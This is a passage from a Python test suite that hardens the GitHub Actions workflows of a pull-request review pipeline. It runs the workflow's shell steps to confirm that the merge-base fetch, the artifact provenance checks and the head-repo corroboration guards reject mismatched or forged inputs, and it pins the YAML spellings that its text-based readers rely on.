        diff = self._step("Build the diff and apply the size gate")
        self.assertIn('git diff "${MERGE_BASE_SHA}" HEAD', diff)
        self.assertIn('git diff --name-only -z "${MERGE_BASE_SHA}" HEAD', diff)
        self.assertNotIn("...HEAD", diff)

    def test_the_fetch_step_runs_before_the_diff_and_before_any_credential(self):
        fetch = self.stripped.find("Fetch the merge base")
        diff = self.stripped.find("Build the diff and apply the size gate")
        creds = self.stripped.find("Configure AWS credentials via OIDC")
        self.assertNotEqual(fetch, -1, "the merge-base fetch step is gone")
        self.assertLess(fetch, diff)
        self.assertLess(fetch, creds)

    def test_the_fetch_proves_the_object_arrived(self):
        """A partial fetch would otherwise surface as a confusing diff error."""
        block = self._step("Fetch the merge base")
        self.assertIn("--depth=1", block)
        self.assertIn("git cat-file -e", block)

    def test_the_merge_base_guard_is_executable_not_a_comment(self):
        """`strip_comments` drops whole-line comments only, so assert by running.

        Round 1 of the cross-model review defeated the earlier version of this
        by appending `# no merge base between` to a `|| true`. The fix is to
        execute the extracted shell rather than to match its text.
        """
        with tempfile.TemporaryDirectory() as td:
            # `git fetch` succeeds, `git cat-file -e` fails: the object did not
            # arrive. The step must exit non-zero.
            proc, _out = run_step(
                self.text,
                "Fetch the merge base",
                td,
                {"MERGE_BASE_SHA": "0" * 40},
                {
                    "git": '#!/bin/bash\ncase "$1" in\n'
                    "  fetch) exit 0 ;;\n"
                    "  cat-file) exit 1 ;;\n"
                    "  *) exit 0 ;;\nesac\n"
                },
            )
        self.assertNotEqual(
            proc.returncode, 0, "a merge base that never arrived was accepted"
        )
        self.assertIn("did not arrive", proc.stdout + proc.stderr)


class TestTheProvenanceGuardsRejectWhenTheyDisagree(unittest.TestCase):
    """Executed, not read: the two guards that authenticate the request.

    Stage 2 runs on `workflow_run`, so everything it is told about the pull
    request arrives either in an artifact Stage 1 uploaded or from the API. Two
    guards in `prepare` make that trustworthy — the artifact's `head_sha` must
    equal the event's, and the API's head repo and branch must equal the
    event's. With either one passing on a mismatch, a run can be pointed at a
    commit or a pull request of someone else's choosing while every other
    assertion in this file is satisfied.

    Both are one line of shell, and no text pin has held: the comparison, the
    branch and a standalone `exit 1` inside it all survive `|| true` while the
    step exits 0. So each is RUN, with inputs that disagree, and the assertion
    is on the exit status. Each test also has a POSITIVE control, because a
    guard that rejects everything would satisfy a rejection test while
    reviewing nothing.

    BOTH FIELDS DISAGREEING is its own case, not the union of the two
    single-field ones. An inner test rewritten to `if [ repo = ] || [ ref = ];
    then exit 1; fi` rejects each single mismatch — one field still agrees —
    and accepts the run where both differ, which is the interesting one.

    WHAT THIS HARNESS DOES NOT EXERCISE, stated so the next reader does not
    infer coverage from the class name: the artifact size cap, the four shape
    regexes in `coords`, the draft/label eligibility gate, and the changed-file
    size gate. Their branches are reached with fixture values that satisfy
    them. The merge-base validator is covered separately by
    `TestThePrCheckoutIsNotAFullClone`.
    """

    ARTIFACT = {
        "pr_number": "7",
        "head_sha": STUB_API_HEAD,
        "base_sha": STUB_API_BASE,
        "is_fork": "false",
        "trigger_event": "labeled",
    }

    def _run_coords(self, td: str, *, artifact=None, event_head_sha=STUB_API_HEAD):
        """Execute `prepare`'s artifact validation step on a real JSON file."""
        req = Path(td) / "request"
        req.mkdir(exist_ok=True)
        (req / "pr-review-request.json").write_text(
            json.dumps({**self.ARTIFACT, **(artifact or {})})
        )
        return run_step(
            STAGE2.read_text(),
            "Validate and authenticate the request",
            td,
            {"EVENT_HEAD_SHA": event_head_sha},
            {},
        )

    def test_a_matching_artifact_is_accepted_and_its_coordinates_exported(self):
        """The positive control for the head_sha guard."""
        with tempfile.TemporaryDirectory() as td:
            proc, out = self._run_coords(td)
            written = out.read_text()
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        # THE WHOLE OUTPUT, parsed the way the runner parses it. These are the
        # coordinates every later step reads; a fourth entry would be an
        # unmodelled output, and a repeated key would mean the value this test
        # checked is not the one that survives. Compared as a MAPPING, because
        # the order of three independent assignments is not a contract.
        self.assertEqual(
            sole_outputs(self, written),
            {
                "pr_number": "7",
                "head_sha": STUB_API_HEAD,
                "trigger_event": "labeled",
            },
            f"the authenticated coordinates are {written!r}",
        )

    def test_an_artifact_naming_another_commit_is_refused(self):
        """A forged artifact could otherwise name any commit in the repo."""
        with tempfile.TemporaryDirectory() as td:
            proc, out = self._run_coords(td, event_head_sha="d" * 40)
            written = out.read_text()
        self.assertNotEqual(
            proc.returncode,
            0,
            "the artifact's head_sha disagreed with workflow_run.head_sha and "
            "the step accepted it; the run reviews a commit of the artifact "
            "author's choosing.",
        )
        self.assertIn("captured head_sha", proc.stdout + proc.stderr)
        self.assertNotIn(
            "head_sha=",
            written,
            "the step exported coordinates it had just failed to authenticate",
        )

    def test_a_run_from_another_pull_request_is_refused(self):
        """The API's head repo and branch must be the event's, both of them."""
        for label, kwargs in (
            ("head repo", {"event_head_repo": "attacker/r"}),
            ("head branch", {"event_head_branch": "other"}),
            (
                "both",
                {"event_head_repo": "attacker/r", "event_head_branch": "other"},
            ),
        ):
            with self.subTest(field=label), tempfile.TemporaryDirectory() as td:
                proc, out, _argv = run_corroboration("c" * 40, td, **kwargs)
                written = out.read_text()
            self.assertNotEqual(
                proc.returncode,
                0,
                f"the API and the event disagreed on {label} and the step "
                "accepted it; a run can be pointed at a different pull "
                "request.",
            )
            self.assertIn("but the run came from", proc.stdout + proc.stderr)
            self.assertEqual(
                written,
                "",
                f"the step recorded {written!r} for a pull request it had "
                "just failed to corroborate",
            )

    def test_an_agreeing_pull_request_is_accepted(self):
        """The positive control: an agreeing run must reach a REVIEWABLE state.

        `eligible` alone is not that. Appending `fresh=false` after the
        `fresh=true` write leaves every rejection test above passing while no
        review ever runs, so both outputs the downstream `if:`s read are
        pinned, and a fork — the population this pipeline exists for — is
        covered beside a same-repo pull request.
        """
        for label, kwargs, is_fork in (
            ("same repo", {}, "false"),
            (
                "fork",
                {"api_head_repo": "forker/r", "event_head_repo": "forker/r"},
                "true",
            ),
        ):
            with self.subTest(head=label), tempfile.TemporaryDirectory() as td:
                proc, out, _argv = run_corroboration("c" * 40, td, **kwargs)
                written = out.read_text()
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            got = sole_outputs(self, written)
            self.assertEqual(
                (got.get("eligible"), got.get("fresh"), got.get("is_fork")),
                ("true", "true", is_fork),
                f"an agreeing {label} pull request recorded {written!r}; the "
                "review job runs only when eligible AND fresh are true.",
            )

    def test_a_pull_request_that_moved_on_is_skipped_rather_than_reviewed(self):
        """The freshness branch, which the agreeing controls never reach.

        Reviewing a superseded commit spends a model call on code nobody will
        merge, and — because the row carries the OLD head — records a verdict
        against a commit the API no longer calls current.
        """
        with tempfile.TemporaryDirectory() as td:
            proc, out, _argv = run_corroboration("c" * 40, td, api_head="e" * 40)
            written = out.read_text()
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        got = sole_outputs(self, written)
        self.assertEqual(
            (got.get("eligible"), got.get("fresh")),
            ("true", "false"),
            f"the PR had moved to a new head and the step recorded {written!r}",
        )


class TestTheReadersPremisesStillHold(unittest.TestCase):
    """PyYAML is not available to the runner, so this suite reads YAML as TEXT.

    That is a sound way to pin a file whose spelling you also control, and an
    unsound way to parse YAML in general — the language has many spellings for
    one value, and a text reader silently mis-reads the ones it was not written
    for. A `path: !!str ''` reads as a non-empty path; a `path: |-` body of two
    lines reads as its first line only; a `run: >` yields shell that FOLDING
    would have joined into something bash rejects; a branch list's inline
    comment tokenizes as a branch name.

    Chasing those one spelling at a time does not converge. This class is the
    alternative: it pins the SPELLINGS the readers are written for, at ONE
    place. Reformatting the workflow is allowed; doing it without updating the
    reader is what must not pass silently. So a mis-read becomes a loud failure
    HERE, naming the reader to fix, instead of a quiet false green elsewhere.

    If you are here because you reformatted a workflow: nothing is wrong with
    your YAML. Update the reader this test names, then update this test.
    """

    def test_both_review_checkout_paths_are_plain_scalars(self):
        """The reader in TestBothReviewCheckoutsStayOutOfTheWorkspaceRoot."""
        review = job_block(STAGE2.read_text(), "review")
        steps = steps_using(review, "actions/checkout")
        self.assertEqual(len(steps), 2, "premise changed: not two checkouts")
        for step in steps:
            lines = with_block(step)
            hits = [
                (i, uncommented(mm.group(1)))
                for i, ln in enumerate(lines)
                if (mm := _key_re("path").match(ln))
            ]
            self.assertEqual(len(hits), 1, f"expected one `path:` key, got {hits}")
            i, value = hits[0]
            # A plain scalar CONTINUES onto a following more-indented line, and
            # YAML folds the two with a space — so `path: trusted` followed by
            # an indented `/..` is the single value `trusted /..`, which
            # normalizes to the workspace root while a line-at-a-time reader
            # sees only `trusted`. A comment line is NOT a continuation.
            indent = len(lines[i]) - len(lines[i].lstrip())
            nxt = next(
                (
                    ln
                    for ln in lines[i + 1 :]
                    if ln.strip() and not ln.lstrip().startswith("#")
                ),
                "",
            )
            self.assertFalse(
                nxt and len(nxt) - len(nxt.lstrip()) > indent,
                f"the checkout `path:` scalar continues onto the next line "
                f"({nxt.strip()!r}); the reader is line-at-a-time and would "
                "validate only the first line of the folded value.",
            )
            # POSITIVE grammar, not a blacklist of the spellings seen so far. A
            # blacklist of `|>!!&*` prefixes accepts `path: "."`, which YAML
            # decodes to the workspace root while the reader — which only
            # strips quotes and normalizes the UNDECODED text — sees a harmless
            # name. Anything outside this grammar is a spelling the reader
            # cannot be trusted on, whatever it decodes to.
            self.assertRegex(
                value,
                r"^[A-Za-z0-9_][A-Za-z0-9._/-]*$",
                f"a checkout `path:` is not a plain unquoted scalar ({value!r}). "
                "The reader in TestBothReviewCheckoutsStayOutOfTheWorkspaceRoot."
                "test_every_checkout_in_the_review_job_declares_a_path does not "
                "decode YAML — it cannot see through quoting or an escape, so "
                "teach it this spelling, then widen this grammar.",
            )
            # Shape is not resolution: `null`, `Null`, `NULL` and `~` all match
            # the grammar above yet resolve to an empty value — the
            # workspace-root checkout again — and the reader normalizes the
            # literal string "null" and finds nothing wrong with it.
            self.assertNotIn(
                value,
                {"null", "Null", "NULL", "~", "Yes", "No", "On", "Off"},
                f"a checkout `path:` is the YAML scalar {value!r}, which "
                "resolves to an empty or boolean value rather than the "
                "directory name it looks like",
            )

    # Every step this suite EXECUTES. Each is extracted with `scalar_block`
    # and handed to bash, so each must be a LITERAL block. Carries the FILE as
    # well as the job: Stage 1's capture step is executed too, and keying this
    # list to STAGE2 alone silently exempted it.
    EXECUTED_STEPS = (
        (STAGE2, "prepare", "Re-derive the triggering workflow path"),
        (STAGE2, "prepare", "Download Stage-1 artifact"),
        (STAGE2, "prepare", "Close out an oversized request"),
        (STAGE2, "prepare", "Corroborate the claimed PR against the trusted API"),
        (STAGE2, "review", "Fetch the merge base"),
        (STAGE1, "capture", "Capture PR coordinates"),
        (SUITE_CI, "test", "Refuse a suppressed or emptied suite"),
    )

    def test_every_executed_step_uses_a_literal_block_scalar(self):
        """The `scalar_block` readers that run the extracted shell.

        `|` keeps newlines; `>` FOLDS them. Extracting a folded scalar as if it
        were literal yields shell the runner would never execute — a `for` and
        the comments above it join into one line — so the executable tests
        would pass against code that is not what runs.
        """
        for path, job, marker in self.EXECUTED_STEPS:
            block = job_block(path.read_text(), job)
            self.assertIn(marker, block, f"premise changed: {marker!r} is not in {job}")
            step = block.split(marker, 1)[1].split("- name:", 1)[0]
            # The step's OWN `run:`, found the same way the readers find it —
            # stepping over every neighbouring block scalar rather than taking
            # the first textual `run:`, which an `env:` value can supply.
            runs = block_scalars(step, "run")
            self.assertEqual(
                len(runs),
                1,
                f"{marker!r} does not have exactly one `run:` block scalar "
                f"({len(runs)} found); the readers extract one and would run "
                "something other than the step's command.",
            )
            header, body = runs[0]
            # `|` or `|-`/`|+`, and NO explicit indentation indicator. `>` folds
            # lines, so the extracted script would differ from what Actions
            # runs. `|1` is subtler: YAML keeps one leading space on every body
            # line and `textwrap.dedent` removes it, which is invisible in
            # ordinary shell and silently re-indents a heredoc terminator.
            self.assertRegex(
                header.lstrip("!").replace("str", "").strip(),
                r"^\|[-+]?$",
                f"{marker!r} no longer runs a plain LITERAL block ({header!r}); "
                "the reader extracts it verbatim and dedents it, which is only "
                "faithful for `|`, `|-` and `|+` — teach the reader this "
                "spelling, then widen this test.",
            )
            # SPACES ONLY in the indentation. A tab after the common space
            # prefix is scalar CONTENT to YAML, and `textwrap.dedent` — which
            # strips the longest common whitespace prefix, tabs included —
            # removes it. Invisible in ordinary shell, and enough to move a
            # heredoc terminator so the real script stops terminating it.
            tabbed = [ln for ln in body if "\t" in ln[: len(ln) - len(ln.lstrip())]]
            self.assertEqual(
                tabbed,
                [],
                f"{marker!r} indents its shell with tabs ({tabbed[:1]}); the "
                "reader dedents, which would strip content YAML preserves.",
            )

    def test_the_suite_ci_branch_filter_is_a_single_line_flow_list(self):
        """The branch reader in TestTheSuiteActuallyRunsInCI."""
        inline = next(
            (
                uncommented(mm.group(1))
                for ln in strip_comments(SUITE_CI.read_text()).splitlines()
                if (mm := _key_re("branches").match(ln))
            ),
            None,
        )
        self.assertIsNotNone(inline, "premise changed: no `branches:` key")
        # THE WHOLE LIST, matched as one grammar, before any splitting. A
        # reader that splits first and validates the fragments accepts
        # `['main[ab]x']` — which matches `mainax`, never `main` — as the three
        # acceptable pieces `main`, `ab`, `x`, and the single quoted name
        # `'release,main'` as two. Brackets and commas inside a quoted item
        # must not be able to disappear.
        #
        # LITERAL NAMES ONLY, no glob and no exclusion: the reader asks "is
        # `main` listed", which is a sound reading of the filter only when
        # GitHub's ordered pattern matching cannot disagree with membership.
        name = r"[A-Za-z0-9_][A-Za-z0-9._/-]*"
        self.assertRegex(
            inline,
            rf"^\[[ \t]*{name}(?:[ \t]*,[ \t]*{name})*[ \t]*\]$",
            f"the push branch filter ({inline!r}) is not a one-line flow list "
            "of unquoted literal branch names. The reader in "
            "TestTheSuiteActuallyRunsInCI.test_push_to_main_triggers_it_for_"
            "the_same_paths does a membership test where GitHub does ordered "
            "pattern matching, and cannot see quoting — teach it, then widen "
            "this grammar.",
        )


if __name__ == "__main__":
    run_this_suite()
